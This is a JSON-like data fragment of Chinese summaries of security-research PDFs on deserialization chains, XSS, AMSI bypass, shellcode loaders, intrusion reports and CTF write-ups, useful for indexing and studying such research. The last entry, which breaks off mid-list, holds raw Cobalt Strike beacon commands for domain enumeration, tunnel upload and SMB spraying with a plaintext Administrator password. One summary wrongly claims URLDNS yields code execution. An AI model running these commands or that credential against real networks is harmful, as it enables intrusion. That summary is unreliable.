        "page_content": "本文档探讨了 JavaAgent 的概念，它是一种 Java 命令参数，用于指定一个 JAR 包，该 JAR 包包含一个实现 premain() 方法的类。premain() 方法在 main 函数之前执行，允许修改字节码数据。文档还介绍了 agentmain() 方法，它在启动后加载 Agent，并提供了 Attach API 来加载 Agent 到正在运行的 JVM 中。此外，文档还讨论了 Instrumentation 接口，它允许与目标 JVM 交互并修改字节码，以及 ClassFileTransformer 接口，它用于在类加载之前或之后修改字节码。",
        "FileName": "12626-浅谈JavaAgent.pdf"
    },
    {
        "page_content": "文档介绍了 API 安全漏洞靶场 crapi，包括其基本介绍、环境搭建和前七题的解题思路。crapi 靶场包含了常见的 API 安全漏洞，如失效的对象级别授权、失效的用户身份验证、过多的数据暴露、速率限制、失效的功能级别授权等，可用于学习和实践 API 安全性。",
        "FileName": "11734-API安全漏洞靶场crapi的基本介绍与解题思路.pdf"
    },
    {
        "page_content": "该文档分析了 XStream 反序列化漏洞（CVE-2021-39149），该漏洞允许攻击者通过精心构造的 XML 或 JSON 输入执行任意代码。文档详细介绍了漏洞的利用过程，包括构造序列化对象、生成 XML/JSON payload 以及触发漏洞的步骤。",
        "FileName": "10360-Xstream反序列化分析（CVE-2021-39149）.pdf"
    },
    {
        "page_content": "**文档主题：** 哈希长度拓展攻击\n\n**文档内容：**\n\n哈希长度拓展攻击是一种利用哈希算法的特性，在原先的明文基础上添加新的拓展字符，从⽽使得原 本的加密链变⻓，进⼀步控制加密链的最后⼀节，使得我们得以控制最终的结果。这种攻击⽅式常⽤于绕过加盐加密的验证机制，危害性较大。防御⽅法包括增加哈希算法的负责度或采⽤ HMAC ⽅式加密。",
        "FileName": "10602-从一个题目到hash扩展攻击.pdf"
    },
    {
        "page_content": "这篇文档讲述了作者在 Facebook 上挖掘反射型 XSS 漏洞的经历，包括利用 MicroStrategy Web SDK 的 UploadFileTask 类和 wikiScrapper 任务中的 searchString 参数。作者通过创建恶意 HTML 代码并将其托管在 HTML Pasta 上，成功利用了这些漏洞，并获得了 Facebook 的奖励。",
        "FileName": "7933-Bug Bounty Facebook XSS漏洞挖掘.pdf"
    },
    {
        "page_content": "该文档详细介绍了 Flask Pin 码的生成过程，包括六个参数的来源和加密方法。它还提供了在不同系统（Linux、Mac、Windows）中获取机器 ID 的方法。文档还讨论了 Flask Pin 码生成过程的历史演变，以及在不同版本中机器 ID 获取顺序的变化。",
        "FileName": "11647-Flask Pin码构造详解.pdf"
    },
    {
        "page_content": "本文记录了一次对色情网站的渗透经历，通过挖掘后台未授权登录和文件上传漏洞，成功获取了服务器的控制权。攻击者通过分析前端代码发现了未授权登录漏洞，修改返回数据包后成功进入后台。随后，他们利用文件上传功能上传了一句话木马，并通过哥斯拉BypassDisableFunctions模块绕过命令执行限制，最终使用CVE-2021-4034提权拿下主机。",
        "FileName": "11729-从前端代码审计挖掘未授权进入后台到文件上传拿下某色情网站.pdf"
    },
    {
        "page_content": "**主题：** Thinkphp5.0.x 反序列化利用链分析\n\n**内容：** 该文档详细分析了 Thinkphp5.0.x 中的一个反序列化利用链，该利用链涉及多个类和方法，包括 Windows、Pivot、Query、HasOne、Output、Memcached 和 File。通过构造一个特定的对象序列，攻击者可以触发 Output 类的 __call 方法，并最终利用 File 类的 set 方法在服务器上写入一个 webshell。该利用链利用了 Model 类的 __toString 方法、Output 类的 __call 方法和 File 类的 set 方法中的漏洞，并通过 php://filter 过滤器绕过了拼接的 exit() 函数。",
        "FileName": "10364-Thinkphp5.0.x反序列化利用链分析.pdf"
    },
    {
        "page_content": "该文档介绍了利用 Yii2 框架中的反序列化漏洞执行任意命令的新方法。该漏洞利用了 Faker 库中 call 方法的两个代码执行点，绕过了 __wakeup() 限制。攻击者可以通过构造一个可控的 RunProcess 对象，将 DefaultGenerator 的 default 属性设置为要执行的命令，从而触发 call 方法并执行任意命令。",
        "FileName": "9420-Yii2反序列化RCE 新POP链.pdf"
    },
    {
        "page_content": "该文档分析了 MS16-063 漏洞，该漏洞是 Internet Explorer 中的 UAF 漏洞，可绕过 CFG。文档详细介绍了漏洞的原理、利用过程和补丁分析，包括利用 TypedArray、Double Free 和 Chakra JIT 绕过 CFG 的技术。",
        "FileName": "8442-MS16-063绕过CFG利用.pdf"
    },
    {
        "page_content": "该文档主要讨论了威胁情报的定义、SRC 接收的漏洞情报类型、挖掘威胁情报的方法以及在不同 SRC 提交情报的感受。文档强调了威胁情报的价值，并提供了挖掘订单泄漏、刷单、视频刷量、账号实名制解除等情报的具体方法。此外，文档还建议在提交情报时提供详细的信息，以提高情报处理效率。",
        "FileName": "11119-SRC威胁情报挖掘.pdf"
    },
    {
        "page_content": "该文档详细介绍了 CSV 注入，一种通过在可导出为 CSV 或 XLS 格式的文本中插入恶意 Excel 公式来执行命令的攻击技术。它解释了 CSV 注入的原理，包括使用 DDE（动态数据交换）在 Excel 中执行外部应用程序。文档还提供了利用 CSV 注入进行 OS 命令执行、反弹 shell、修改注册表、信息泄露和网络钓鱼的示例。最后，它提供了缓解 CSV 注入攻击的建议，例如查找导出点、确定内容可控性以及绕过过滤。",
        "FileName": "12272-CSV注入详解.pdf"
    },
    {
        "page_content": "该文档介绍了一种使用 C# 实现自定义 DNS 服务器来传输 shellcode 的方法，该方法利用 DNS 协议的隐蔽性，通过设计传输规范和使用 ARSoft.Tools.Net 库，可以将 shellcode 分段传输到客户端，并通过注入到内存中执行。",
        "FileName": "8921-C#免杀之自实现DNS服务器传输shellcode.pdf"
    },
    {
        "page_content": "该文档详细介绍了 CVE-2021-27927 漏洞，该漏洞是一个 CSRF 漏洞，可导致 Zabbix 管理员帐户被接管，并最终导致远程命令执行。该漏洞利用了 Zabbix 身份验证设置中反 CSRF 令牌验证的缺失，攻击者可以通过诱使受害者点击恶意链接来利用该漏洞，即使浏览器启用了 SameSite=Lax Cookie 保护。",
        "FileName": "9294-详解CVE-2021-27927漏洞：从CSRF到RCE.pdf"
    },
    {
        "page_content": "该文档分析了某 OA 系统的 Java 代码，发现过滤器中存在缺陷，导致未授权用户可以通过绕过登录检测实现未授权文件上传。随后，通过目录遍历漏洞获取 shell 文件名，最终成功获取 RCE 权限。",
        "FileName": "9226-某oa java代码审计2.pdf"
    },
    {
        "page_content": "**主题：** TP5 网站 Getshell 方法测试\n\n**内容：** 该文档详细介绍了在 TP5 网站上使用各种方法获取 shell 的过程，包括 RCE、日志包含、会话包含和 exec 函数。作者通过实战测试，验证了这些方法的可行性，并提供了详细的步骤和代码示例。",
        "FileName": "10397-一次实战中对tp5网站getshell方式的测试.pdf"
    },
    {
        "page_content": "文档主题是使用 CodeQL 挖掘 FastJSON 利用链，内容包括定义 FastJSON 的入口点、危险函数和搜索方法，并提供了一个示例查询来查找 FastJSON 利用链。",
        "FileName": "7482-使用codeql挖掘fastjson利用链.pdf"
    },
    {
        "page_content": "该文档分析了 YzmCMS 5.4 后台管理系统中的两个安全漏洞，这些漏洞允许攻击者通过缓存文件写入和配置文件修改来获取后台访问权限。第一个漏洞利用了缓存文件写入函数中序列化的代码执行，而第二个漏洞利用了配置修改函数中对特殊字符的过滤不当，从而允许攻击者注入恶意代码。",
        "FileName": "7231-YzmCMS 5.4 后台getshell.pdf"
    },
    {
        "page_content": "本文档分析了 AntCTF x D³CTF 2023 d3op 复盘笔记，该笔记详细介绍了如何利用 base64 漏洞进行代码执行。文章首先概述了文档的主题和内容，然后深入分析了漏洞的细节，包括 diff 分析、漏洞分析和利用方法。最后，文章提供了利用漏洞的完整命令和远程交互结果。",
        "FileName": "12522-AntCTF x D³CTF 2023 d3op复盘笔记.pdf"
    },
    {
        "page_content": "该文档介绍了如何在 IIS+ASPX 环境下利用 HTTP 参数污染绕过 WAF，通过拆分代码并使用注释符号来绕过 WAF 的过滤，最终成功上传菜刀一句话木马，获取菜刀 shell。",
        "FileName": "7508-记一次iis+aspx环境下利用http参数污染绕过waf.pdf"
    },
    {
        "page_content": "本文分析了 Java 对象序列化流格式，并使用 SerializationDumper 工具查看了 ysoserial URLDNS 生成的对象序列化流。该流包含一个 HashMap 对象，其中包含一个 URL 对象，其 host 字段设置为 \"bezfdp.dnslog.cn\"，并利用 HashMap 的 writeObject() 方法写入自定义数据，导致在反序列化时触发对该域名的 DNS 解析，从而实现远程代码执行。",
        "FileName": "8686-SerializationDumper辅助研究ysoserial URLDNS反序列化原理.pdf"
    },
    {
        "page_content": "本文探讨了反恶意软件扫描接口 (AMSI) 的原理和绕过技术，AMSI 是 Windows 10 和 Server 2016 中默认安装的安全机制，用于检测恶意脚本。通过使用 detours 库 hook AmsiScanBuffer 函数并修改其返回值，可以绕过 AMSI 的检测，从而允许执行恶意脚本。此外，还可以通过将 amsibypass.dll 注入到 PowerShell 进程中来绕过 AMSI 的拦截。",
        "FileName": "7973-AMSI原理与绕过---上.pdf"
    },
    {
        "page_content": "**文档主题：** 浅谈 AWD 攻防赛的生存攻略\n\n**文档内容：**\n\nAWD 攻防赛是一种网络安全竞赛，参赛者需要维护多台服务器（一般两三台，视小组参赛人数而定），服务器中存在多个漏洞（web 层、系统层、中间件层等），利⽤漏洞攻击其他队伍可以进⾏得分，加固时间段可⾃⾏发现漏洞对服务器进⾏加固，避免被其他队伍攻击失分。\n\n**总结：**\n\n本文档详细介绍了 AWD 攻防赛的规则、内容、常用技术和防守思路，为参赛者提供了全面的生存攻略。",
        "FileName": "11409-浅谈AWD攻防赛的生存攻略.pdf"
    },
    {
        "page_content": "该文档详细描述了作者在渗透测试中利用 RCE 漏洞获取系统权限，并尝试通过各种方法上线和获取敏感信息的过程。作者成功利用 RCE 漏洞执行命令，但由于系统限制无法使用空格，因此无法直接使用 PowerShell 上线。随后，作者使用 PHP Webshell 绕过限制，但由于 360 安全软件的阻碍，无法使用 Windows 上线。最终，作者通过导出注册表的方式获取 Windows NTLM-hash，但爆破密码未果。最后，作者通过添加用户并使用冰蝎虚拟终端，成功执行 PowerShell 命令并上线。",
        "FileName": "8583-实战Rce到玄学上线.pdf"
    },
    {
        "page_content": "本文分析了网络上现有的 shellcode 加载器，介绍了从最原始的 VirtualAlloc 申请可读可写可执行内存到利用各种 API 函数绕过杀软的渐进式加载模式，以及利用 UUID、MAC、IPv4、IPv6 等方式实现内存加载的创新方法。",
        "FileName": "12253-初探shellcode加载器.pdf"
    },
    {
        "page_content": "该文档记录了作者在渗透测试中通过弱口令和越权漏洞获取 IBM-Lotus Notes 系统管理员权限的过程，并尝试通过 webadmin.nsf 访问控制台执行命令，但未成功。作者寻求其他获取 shell 的方法。",
        "FileName": "8629-Getshell的途中.pdf"
    },
    {
        "page_content": "该文档分析了通达 OA 办公软件中的文件上传和文件包含漏洞。文件上传漏洞影响所有版本，而文件包含漏洞仅存在于 V11.3 版本中。攻击者可以通过绕过登录限制和上传恶意文件来利用这些漏洞，从而在目标系统上执行任意代码。",
        "FileName": "7433-通达OA文件上传及文件包含漏洞分析.pdf"
    },
    {
        "page_content": "该文档分析了 NSA 的 Emissary 项目中的两个不安全的反序列化漏洞 (CVE-2021-32634)，这些漏洞允许经过身份验证的攻击者通过对 /WorkSpaceClientEnqueue.action 端点的 POST 请求发送恶意序列化对象来执行任意代码。",
        "FileName": "10046-分析Emissary 的反序列化漏洞 (CVE-2021-32634).pdf"
    },
    {
        "page_content": "**主题：** ROME 框架的漏洞利用，通过反序列化触发恶意代码执行。\n\n**内容：** ROME 框架是一个用于 RSS 和 Atom 订阅的 Java 框架，存在一个反序列化漏洞。攻击者可以通过精心构造的 XML 文档，在反序列化过程中触发恶意代码执行，从而控制目标系统。该漏洞利用涉及修改 ToStringBean 对象的 _beanClass 和 _obj 字段，以执行 TemplatesImpl 类的 getOutputProperties 方法，从而触发恶意代码。",
        "FileName": "12510-ROME链试探.pdf"
    },
    {
        "page_content": "该文档分析了 Weblogic Xmldecoder 反序列化漏洞，重点介绍了如何构造命令回显和植入内存马。它提供了通用的回显和内存马有效载荷，并讨论了其他命令回显方法，如 RMI 绑定实例、URLClassLoader 抛出异常回显和 JNDI 回显。此外，该文档还介绍了 Weblogic filter 和 listener 类型内存马的原理和构造流程。",
        "FileName": "10323-Weblogic Xmldecoder反序列化中的命令回显与内存马总结.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用各种 SQL 注入技术（例如最简单的 SQL 注入、宽字节注入、错误注入、盲注、SQL 注入通用防护、cookie 注入和 MD5 加密后的 SQL 注入）来绕过安全措施并获取数据库信息，包括数据库名、表名、列名和数据。",
        "FileName": "12145-网络安全实验室4.注入关.pdf"
    },
    {
        "page_content": "本文探讨了 Serverless Lambda 攻击和横向移动方法，重点关注三个问题：Lambda 面临的攻击场景、在哪些情况下 Lambda 中读取的 env 环境变量密钥可以接管服务器甚至整个账号，以及在哪些情况下可以通过 Lambda 权限横向移动到其他 EC2 服务器。通过分析 Lambda 的默认配置和 IAM 权限，本文演示了如何利用 env 信息获取 EC2 权限，并通过 SSM 权限在 EC2 上执行命令。此外，本文还讨论了在 Lambda 函数中使用 VPC 时横向移动的可能性，以及如何使用 kscan 在 VPC 中扫描存活的服务器。",
        "FileName": "11442-ServerLess Aws Lambda攻击与横向方法研究.pdf"
    },
    {
        "page_content": "该文档分析了开源日志组件 Logback 中的攻击路径，重点关注其配置文件动态更新功能。通过覆盖 Logback 配置文件，攻击者可以利用 XXE、JNDI 和 JMX 等多种攻击方式，包括远程代码执行和未经授权的访问。",
        "FileName": "7351-日志库logback的攻击路径.pdf"
    },
    {
        "page_content": "该文档介绍了一种从无害逻辑漏洞挖掘通用漏洞的方法，通过修改返回包中的代码值绕过登录验证，并利用后台调用的关键 JS 接口中的 SQL 注入漏洞获取数据。",
        "FileName": "10102-从无危害逻辑漏洞到通用漏洞挖掘.pdf"
    },
    {
        "page_content": "本文分析了 Dom Clobbering 攻击技术，该技术通过向网页中注入 HTML 代码来操纵 DOM，最终更改页面上 JavaScript 行为。攻击者可以通过覆盖 document 或 window 对象的属性或全局变量来实现此目的，从而劫持变量内容或更改 JavaScript 行为。本文提供了多个示例来说明如何使用 Dom Clobbering 技术，并讨论了防御此类攻击的措施。",
        "FileName": "7329-使用 Dom Clobbering 扩展 XSS.pdf"
    },
    {
        "page_content": "该文档详细介绍了内网渗透的步骤，包括信息收集、提权、代理搭建、域横向移动、哈希传递、票据制作、跨域攻击和上线方式。渗透过程从利用钓鱼邮件获取外网服务器权限开始，逐步进行权限提升、内网主机存活扫描、域横向移动、哈希传递登录、票据制作和跨域攻击，最终实现对内网目标主机的控制。",
        "FileName": "10833-结合实战内网渗透思路总结.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用泄露的企业微信和腾讯 IM 密钥来访问企业微信和腾讯 IM 的各种功能，包括获取部门列表、成员信息、打卡规则、假期余额、即时通信群组信息、运营数据、消息记录和服务器 IP 地址。",
        "FileName": "11092-企业微信+腾讯IM密钥泄漏利用.pdf"
    },
    {
        "page_content": "该文档详细介绍了 15 种不同的跨站脚本 (XSS) 攻击类型，包括反射型和存储型 XSS，并提供了针对每种类型的有效攻击载荷和绕过技术。它涵盖了各种场景，例如 GET 和 POST 请求、AJAX 调用、JSON 解析、自定义 HTTP 头和登录表单，并强调了不同过滤和编码技术对 XSS 攻击的有效性。",
        "FileName": "12080-6.bWAPP XSS.pdf"
    },
    {
        "page_content": "该文档分析了某 IP 设备代码中的五个漏洞，包括任意文件上传、任意文件写入和任意文件读取。这些漏洞允许攻击者上传、写入和读取设备上的任意文件，从而可能导致敏感信息泄露、设备控制或其他恶意活动。",
        "FileName": "10521-某IP设备代码审计.pdf"
    },
    {
        "page_content": "**主题：** .NET 反序列化漏洞：JavaScriptSerializer\n\n**内容：**\nJavaScriptSerializer 是 .NET 中用于在对象和 JSON 字符串之间转换的 API。当使用 SimpleTypeResolver 构造函数参数时，序列化的 JSON 中会包含类型信息，从而导致反序列化漏洞。攻击者可以通过构造包含 __type 字段的 JSON 字符串来创建任意类型的对象，从而执行任意代码。",
        "FileName": "9602-.net反序列化之JavaScriptSerializer.pdf"
    },
    {
        "page_content": "## 文档\n```\n1.登录 针对 RMI 服务的九重攻击  -  上 针对 RMI 服务的九重攻击  -  上 啦啦 0 咯咯   /  2020-07-01 09:40:24  /  浏览数  26425 字数： 1w6 推荐阅读时间： >2h 其实起因是听⽼哥讲 \"shiro-721 可以⽤ JRMP 的 payload ，短很多， 1 分钟就可以跑出来 \" ，啊！ JRMP ， RMI 学过，我会的我会 的 ....... 实际上我会个锤⼦， YSO-JRMP 的模块根本没⽤过。 但实际上本⽂只是顺道解决了这个问题的原理，如果只是想知道这个原理，可以到下篇的  JRMP 服务端 打 JRMP 客户端 (ysoserial.exploit.JRMPListener)  中去解答这个疑问，利⽤⽅式是同理的。 然后有⼀天看了⼀波别⼈攻击 RMI 服务的⼯具，瞬间三观崩坏，打脸 piapia 响！ 于是 ..... 花了按照⽉为单位的很⻓时间洋洋洒洒写了 3w 字的⽂整理了针对 RMI 服务的 9 种攻击⽅式，⻓⽂少有⼈能看下去，先丢上最 终的研究的结果吧。（其实我感觉是不是应该去混议题的，算了资历尚浅，下次⼀定。死⼈脸） 如果觉得有什么出⼊，喷就完事了； 同时觉得本⽂对你有帮助， 也请留⾔、评论、关注、⼀键三连⽀持你喜欢的 up 主！你的点赞是我更新的动⼒！如果这期点赞超过 20w ，下篇⽂章直播吃 ..... 咳 ... 同时由于⽂章实在过⻓，图⽚多达 74 张，将全⽂分为上、下两篇。 在上篇中将讲述 针对已知 RMI 接⼝的三种攻击⽅式 与 针对 RMI 层（ RMI 注册端、 RMI 服务端） /DGC 层 ，是对已有常⻅利⽤⽅式的总 结。 前⾔⽽在下篇中将重点讲述 绕过 JEP290 的引⼊ JRMP 的利⽤⽅式 ，这就很好玩了，指出了别的⽼哥的错误之处，找到了别⼈没提及的 骚姿势，复现分析了⽼外的绕过⽅式。 上下篇的⼩结论是沿⽤的，建议配合⻝⽤；⽂中实验代码、环境及⼯具均已上传 github 。 此外安利下 ysomap ，如果没有意外的话，之后会陆续把这些攻击⽅式都移植过去（已经⽀持⼤部分攻击⽅式）。 在学习了⼀整⼦之后回过头去看之前对于 RMI 的理解真是⽚⾯啊 ...... 在  RMI  反序列化⼀⽂中，我们把 RMI 服务的攻击维度分成四个⽅向： 1 .  探测利⽤开放的 RMI 服务 2 .  基于 RMI 服务反序列化过程的攻击 3 .  利⽤ RMI 的动态加载特性的攻击利⽤ 4 .  结合 JNDI 注⼊ 我个⼈推荐把第⼀、第⼆⽅向与第三、第四个⽅向隔离开讨论与理解，第⼆个点是标准反序列化利⽤套 路（ readobject ⼊⼝点 + 利⽤链 +RCE ）。同第⼀个⼀样都是针对 RMI 服务进⾏攻击，即打⼀个 1099 端 ⼝。 ⽽第三、第四个点则是想办法让对⽅服务器加载我们的恶意类，在对⽅服务器上实例化的时候执⾏恶意 的构造函数或静态⽅法等（ JNDI 由于代码还可以执⾏另⼀个⽅法，这⾥不多说了） 我们在本⽂中只专注讨论剖析   探测利⽤开放的 RMI 服务、基于 RMI 服务反序列化过程的攻击 我们对于 1. 探测利⽤开放的 RMI 服务 简单纸上谈兵了⼀下：可能存在可以利⽤的随便写⼊⽂件的类啦巴拉巴拉。 同时简单复现了其中的 2. 基于 RMI 服务反序列化过程 的攻击： 在起⼀个有 CC 利⽤链（ Commons-Collections ）的 RMI 服务端之后，我们将服务端提供的服务的接⼝参数设置成 Object 类型（因为 我们的 payload 就是 Object 对象）然后再拿这个 object 的 payload 去打提供服务的 RMI 服务端，成功。 String \t url \t = \t \"rmi://127.0.0.1:1099/User\" ; User \t userClient \t = \t ( User ) Naming . lookup ( url ); userClient . say ( \"world\" ); userClient . dowork ( getpayload ()); //dowaok 接受⼀个 Object 函数，这时候我们传⼊恶意 object 会在对⽅服务器 readobject 反序列化 于是那时候总结就是，如果 RMI 服务端可以被攻击成功需要： 1 .  服务端提供⼀个 RMI 服务，提供的 RMI 服务的⽅法的参数必须为 Object （因为我们的 payload 是 Object ） 2 .  服务端有可以被利⽤的反序列化利⽤链及环境 于是就觉得辣鸡漏洞，还需要对⽅提供⼀个 Object 的对象来把⾃⼰的 payload 对着这个 Object 点塞进去才⾏。实际情况咋可能，垃 圾。 实际上，对于之前讨论的： 1 .  我们没有对探测利⽤开放的 RMI 服务进⾏进⼀步探究，到底是怎么探测的？ 2 .  RMI 客户端打 RMI 服务端我们知道需要⼀个 Object 接⼝，但是我们是可以查询到这个接⼝是不是有 Object 参数，然后真的就 条 件这么苛刻，没有其他办法了么？ 3 .  之前的分析，完全忽略了 RMI 注册端 的情况。 4 .  之前的分析，完全⽚⾯理解了针对 RMI 服务的攻击，实际上还有很多利⽤⽅式和细节，简直管中窥豹。 5 .  我们没有继续分析相应的利⽤⼯具的使⽤以及实现细节。 6 .  我们没有继续分析在 JDK 版本更新中对于封堵的绕过情况 回顾稚嫩的过去这是⼀⻓串的⼀环套着⼀环的疑问， 我们先来解决第⼀个问题   探测利⽤开放的 RMI 服务到底是个怎样攻击的流程 。 之前我们讲到探测利⽤开放的 RMI 服务，使⽤⼯具 BaRMIe 去寻找可受攻击的 RMI 服务，⽐如可能提供了⽂件上传等危险功能，⼀ 种就跟普通 web 测试差不多的感觉。 但实际上我们要调⽤⼀个存在危险功能的 RMI 服务端需要知道： RMI 对象 a 、⽅法 b 、参数 c ，即 \t a.b(c) \t ⾃然会认为我们作为 RMI 客户端向 RMI 注册端查询有哪些 RMI 服务端，然后再去 RMI 服务端查询接⼝和参数，再根据返回的接⼝和 参数，构造利⽤就好了。 但是回忆⼀下在上⼀篇中讲述的 RMI 通讯流程，好像压根就没有 RMI 客户端向 RMI 注册端查询接⼝（⽅法和参数）的这⼀步骤，都\n```",
        "FileName": "7930-针对RMI服务的九重攻击 - 上.pdf"
    },
    {
        "page_content": "该文档分析了 ThinkPHP5 框架中的代码执行漏洞，该漏洞允许攻击者通过注入换行符绕过注释符限制，从而执行任意代码。漏洞影响 ThinkPHP5 版本 5.0.0 至 5.0.23，可以通过利用 Request 类的 input 方法中未经检查的 filter 参数来触发。",
        "FileName": "7792-Thinkphp5代码执行学习.pdf"
    },
    {
        "page_content": "该文档分析了 Apache Solr 中的 CVE-2021-44548 漏洞，该漏洞允许攻击者通过提供 Windows UNC 路径来触发 SMB 网络调用，从而导致信息泄露。文档详细介绍了漏洞的原理、环境搭建、漏洞分析和利用方法，并指出该漏洞只能读取 SolrCore 下的文件，除非启用 -Dsolr.allow.unsafe.resourceloading=true 选项。",
        "FileName": "10725-记一次失败的CVE-2021-44548分析.pdf"
    },
    {
        "page_content": "本文介绍了在 Cobalt Strike 中设置多种上线提醒方法，包括微信单人提醒、微信多人提醒、钉钉群提醒、邮件提醒和隐蔽邮件提醒。这些方法利用了 Pushplus 等第三方服务或自建邮件服务，可以帮助用户及时收到新主机上线的通知。",
        "FileName": "10698-Cobalt Strike的多种上线提醒方法.pdf"
    },
    {
        "page_content": "该文档详细描述了在靶场环境中进行渗透测试的步骤，包括端点扫描、漏洞利用、信息收集、内网渗透和域控攻击。渗透者利用了 log4j2 漏洞、永恒之蓝漏洞和 CVE-2021-42287/CVE-2021-42278 漏洞，最终获得了域控的 shell 权限并找到了三个 flag。",
        "FileName": "10711-记一次靶场渗透.pdf"
    },
    {
        "page_content": "JNDI（Java 命名和目录接口）是一种应用程序设计 API，它提供了一个统一的客户端 API，允许 Java 应用程序与命名服务和目录服务进行交互。JNDI 注入攻击发生在开发者在定义 JNDI 接口初始化时，lookup() 方法的参数可控，攻击者可以将恶意的 URL 传入参数远程加载恶意载荷，造成注入攻击。",
        "FileName": "12277-JNDI注入原理及利用考究.pdf"
    },
    {
        "page_content": "文档探讨了 Hadoop 中的命令执行漏洞，该漏洞允许攻击者通过向 Hadoop 8088 端口发送 POST 请求来执行任意命令。该漏洞利用了 Hadoop 服务以 ROOT 权限启动时，可以根据用户提交的 POST 数据执行相关作业的事实。攻击者可以通过构造 JSON 请求来提交作业，其中包含要执行的命令，从而在目标系统上执行任意命令。",
        "FileName": "8512-大数据-浅析Hadoop命令执行漏洞.pdf"
    },
    {
        "page_content": "Chunsou 是一款多线程 Web 指纹识别工具，用于资产识别和风险收敛。它支持单目标和多目标指纹识别，可进行子域名爆破和 Fofa 资产收集。该工具使用超过 10000 条指纹规则，包括网站关键字、标题、标头和图标哈希匹配。",
        "FileName": "12658-Chunsou（春蒐）多线程Web指纹识别工具（项目发布）.pdf"
    },
    {
        "page_content": "该文档介绍了如何解决 CISCN2023 初赛 Backendservice 题，通过利用 Nacos 漏洞绕过鉴权，修改 Nacos 用户密码，然后在 Nacos 配置中心新建一个 json 格式的配置，利用 Spring Cloud Gateway 的漏洞执行任意命令，最终获取 flag。",
        "FileName": "12568-CISCN2023 初赛 Backendservice题解.pdf"
    },
    {
        "page_content": "**主题：** Spring 反射性文件下载漏洞 (CVE-2020-5421) 分析\n\n**内容：** CVE-2020-5421 是针对 CVE-2015-5211 修复方式的绕过，通过在 URL 路径中添加 `;jsessionid=` 字符串，绕过 Spring 对文件后缀的白名单检查，从而实现反射性文件下载。",
        "FileName": "8341-Spring反射性文件下载漏洞(CVE-2020-5421)分析.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何绕过宝塔防火墙渗透一个 BC 站点。它首先描述了信息收集和利用 ThinkCMF RCE 获取 shell 的过程。然后，它解释了如何使用 Base64 编码绕过宝塔防火墙，并修改蚁剑以避免被检测到。最后，它讨论了使用哥斯拉马解决跨目录问题。",
        "FileName": "9295-记一次绕过宝塔防火墙的BC站渗透.pdf"
    },
    {
        "page_content": "该文档讨论了如何绕过 Web 应用程序防火墙 (WAF) 来利用常见的中间件漏洞，例如 Struts2 和 Weblogic。它提供了多种绕过技术，包括错误的 HTTP 请求头、通用的 Java 类关键字绕过、使用未公开的漏洞利用链、双写大括号、拆分关键字和使用 chunked 编码。",
        "FileName": "10560-浅谈部分常见中间件漏洞如何绕过WAF.pdf"
    },
    {
        "page_content": "Java 远程方法调用（RMI）是一种实现远程过程调用的应用程序编程接口，它允许一个 Java 虚拟机上的对象调用另一个 Java 虚拟机上的对象上的方法。RMI 涉及三个组件：客户端、服务器和注册表。客户端使用存根代理与服务器上的远程对象进行交互，而服务器使用骨架代理处理客户端请求。注册表用于存储远程对象的引用，以便客户端可以查找它们。RMI 利用反序列化过程，这可能导致反序列化攻击，如果服务器存在执行恶意代码的 JAR 包，则可以利用这些攻击。",
        "FileName": "9261-JAVA安全基础（四）-- RMI机制.pdf"
    },
    {
        "page_content": "本文档详细介绍了作者在挖掘一个网站的评论区中的 XSS 漏洞时的过程。作者通过尝试各种绕过技术，最终成功绕过了 JavaScript 过滤，并利用 HTML 编码和解码技术成功植入了恶意代码。该过程强调了在挖掘 XSS 漏洞时留意 payload 在网站中的变化的重要性。",
        "FileName": "7840-有趣的xss漏洞挖掘.pdf"
    },
    {
        "page_content": "本文档概述了如何分析内部网络渗透测试，并完成以下任务：\n- 使用Sqlmap获取一个命令行模式。\n- 使用xp_cmdshell扩展名执行命令。\n- 提升xp_cmdshell权限。\n- 尝试执行命令，但发现回显太慢，未找到web路径，无法写web木马，这期间尝试使⽤hta⽂件。\n- 提权失败，接着使⽤另⼀个脚本https://github.com/DeEpinGh0st/Erebus成功返回⼀个shell，system权限。\n- [*]\tTask\tBeacon\tto\trun:\tnet\tlocalgroup\tAdministrators\t/domain\n- [*]\tTasked\tbeacon\tto\trun:\tnet\tuser\t/domain\n- [*]\tTasked\tbeacon\tto\trun:\tnet\tgroup\t\"domain\tcomputers\"\t/domain\n- [*]\tTasked\tbeacon\tto\trun:\tnet\tview\t/domain:XXX\n- [*]\tTasked\tbeacon\tto\trun:\tnet\tview\t/domain:10.10.11.13\n- [*]\tTasked\tbeacon\tto\trun:\tC:\\Windows\\TAPI\\SharpHound.exe\t-c\tall\n- [*]\tTasked\tbeacon\tto\tupload\t/Users/apple/Documents/steady-sec/NW/frp/frpc_full.ini\t(C:\\Windows\\TAPI\\frpc_full.ini)\n- [*]\tTasked\tbeacon\tto\tupload\t/Users/apple/Documents/steady-sec/NW/frp/frpc.ini\t(C:\\Windows\\TAPI\\frpc.ini)\n- [*]\tTasked\tbeacon\tto\trun:\tC:\\Windows\\TAPI\\fscan64.exe\t-h\t10.10.10.1/24\t-p\t445\n- [*]\tTasked\tbeacon\tto\trun:\t10.10.10.8/24\t-p\t445\t-user\tAdministrator\t-pwd\tjo6ek6vul3vm,6\t-domain SMB:10.10.10.3:445:Administrator\tjo6ek6vul3vm,6\tWEGO\n- [*]\tTasked\tbeacon\tto\trun:\t10.10.10.1/24\t-p\t445\t-user\tAdministrator\t-pwd\tjo6ek6vul3vm,6\t-domain SMB:10.10.10.41:445:Administrator\tjo6ek6vul3vm,6\tWEGO\n- [*]\tTasked\tbeacon\tto\trun:\t10.10.10.5/24\t-p\t445\t-user\tAdministrator\t-pwd\tjo6ek6vul3vm,6\t-domain SMB:10.10.10.19:445:Administrator\tjo6ek6vul3vm,6\tWEGO\n- [*]\tTasked\tbeacon\tto\trun:\t10.10.10.9/24\t-p\t445\t-user\tAdministrator\t-pwd\tjo6ek6vul3vm,6\t-domain SMB:10.10.10.20:445:Administrator\tjo6ek6vul3vm,6\tWEGO\n- [*]\tTasked\tbeacon\tto\trun:\t10.10.10.100/24\t-p\t445\t-user\tAdministrator\t-pwd\tjo6ek6vul3vm,6\t-domain SMB:10.10.10.100:445:Administrator\tjo6ek6vul3vm,6\tWEGO\n- [*]\tTasked\tbeacon\tto\trun:\t10.10.10.10/24\t-p\t445\t-user\tAdministrator\t-pwd\tjo6ek6vul3vm,6\t-domain SMB:10.10.10.90:445:Administrator\tjo6ek6vul3vm,6\tWEGO\n- 